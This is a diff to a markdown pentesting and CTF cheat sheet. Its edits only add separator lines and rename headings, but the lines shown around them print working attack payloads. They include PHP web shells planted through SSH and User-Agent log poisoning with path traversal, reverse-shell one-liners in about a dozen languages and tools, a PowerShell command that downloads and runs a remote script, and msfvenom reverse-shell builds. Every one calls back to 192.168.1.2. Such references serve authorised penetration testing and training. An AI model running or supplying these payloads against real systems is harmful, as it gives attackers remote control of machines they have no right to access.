@@ -43,7 +43,7 @@ __Pentesting - Red Team - CTFs - OSCP__
   ssh '<?php system($_GET['cmd']); ?>'@192.168.1.2
   ```
 
-`Web Shell (HTTP User-Agent Log Poisoning) -> /var/log/apache2/access.log`
+`Web Shell (HTTP Log Poisoning) -> /var/log/apache2/access.log`
 
   ```cmd
   curl -s -H "User-Agent: <?php system(\$_GET['cmd']); ?>" "http://192.168.1.2/browse.php?file=../../../../../var/log/apache2/access.log"
@@ -80,7 +80,8 @@ __Pentesting - Red Team - CTFs - OSCP__
   ```cmd
   perl -e 'use Socket;$i="192.168.1.2";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
   ```
-
+ ---
+ 
 `Python`
 
   ```cmd
@@ -90,7 +91,8 @@ __Pentesting - Red Team - CTFs - OSCP__
   
    python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.2",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
   ```
-
+ ---
+ 
 `PHP`
   ```php
   php -r '$sock=fsockopen("192.168.1.2",443);`/bin/sh -i <&3 >&3 2>&3`;'
@@ -107,6 +109,7 @@ __Pentesting - Red Team - CTFs - OSCP__
   
   php -r '$sock=fsockopen("192.168.1.2",443);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
   ```
+  ---
   
 `Ruby`
 
@@ -117,19 +120,22 @@ __Pentesting - Red Team - CTFs - OSCP__
 
   ruby -rsocket -e 'c=TCPSocket.new("192.168.1.2","443");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
   ```
+  ---
   
 `Xterm`
 
    ```cmd
    xterm -display 192.168.1.2:443
    ```
-   
+  ---
+  
 `Ncat`
 
   ```cmd
   ncat 192.168.1.2 443 -e /bin/bash
   ```
-
+  ---
+  
 `Powershell`
 
   ```powershell
@@ -139,22 +145,29 @@ __Pentesting - Red Team - CTFs - OSCP__
   
   powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.2:8000/reverse.ps1')
   ```
-
+ ---
+ 
 `Awk`
 
   ```cmd
   awk 'BEGIN {s = "/inet/tcp/0/192.168.1.2/443"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
   ```
+  ---
+  
  `Gawk`
  
  ```cmd
  gawk 'BEGIN {P=443;S="> ";H="192.168.1.2";V="/inet/tcp/0/"H"/"P;while(1){do{printf S|&V;V|&getline c;if(c){while((c|&getline)>0)print $0|&V;close(c)}}while(c!="exit")close(V)}}'
  ```
+ ---
+ 
  `Golang`
 
   ```cmd
   echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","192.168.1.2:443");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
   ```
+  ---
+  
    `Telnet`
 
   ```cmd
@@ -163,6 +176,7 @@ __Pentesting - Red Team - CTFs - OSCP__
   ```
   telnet 192.168.1.2 80 | /bin/bash | telnet 192.168.1.2 443
   ```
+  ---
   
   `Java`
 
@@ -171,11 +185,14 @@ __Pentesting - Red Team - CTFs - OSCP__
   p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/192.168.1.2/443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
   p.waitFor()
   ```
-  `Node.js`
+  ---
+  
+  `Node`
   
   ```cmd
   require('child_process').exec('bash -i >& /dev/tcp/192.168.1.2/443 0>&1');
   ```
+  ---
   
 `Groovy (Jenkins)`
 
@@ -185,8 +202,8 @@ __Pentesting - Red Team - CTFs - OSCP__
   String cmd="cmd.exe";
   Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
   ```
-
-
+  ---
+  
 `Msfvenom`
 
 `Php`
@@ -302,3 +319,4 @@ msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.2 LPORT=443 -f elf > rev
 ```cmd
 msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.2 LPORT=443 -f elf > reverse.elF
 ```
+---
